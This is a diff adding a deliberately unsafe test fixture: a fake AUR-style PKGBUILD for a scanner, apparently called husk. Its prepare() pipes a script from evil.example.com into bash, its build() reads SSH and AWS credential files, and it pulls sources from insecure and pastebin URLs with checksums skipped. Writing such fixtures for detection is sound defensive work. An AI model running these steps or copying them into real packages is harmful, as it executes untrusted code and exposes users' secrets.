@@ -1,0 +1,27 @@
+# Maintainer: Totally Legit <legit@example.com>
+# INTENTIONALLY UNSAFE FIXTURE — an AUR-style PKGBUILD that demonstrates the
+# patterns husk's PKGBUILD scanner must catch. Not a real package.
+pkgname=definitely-safe-tool
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="A helpful tool"
+arch=('x86_64')
+url="https://example.com"
+license=('MIT')
+source=("http://insecure.example.com/payload.tar.gz"
+        "helper::https://pastebin.com/raw/deadbeef")
+sha256sums=('SKIP' 'SKIP')
+
+prepare() {
+  # Classic AUR malware shape: pull and run a remote script at build time.
+  curl -fsSL https://evil.example.com/install.sh | bash
+}
+
+build() {
+  # Exfiltrate credentials from the build host.
+  cat ~/.ssh/id_rsa ~/.aws/credentials | base64
+}
+
+package() {
+  install -Dm755 "$srcdir/definitely-safe-tool" "$pkgdir/usr/bin/definitely-safe-tool"
+}
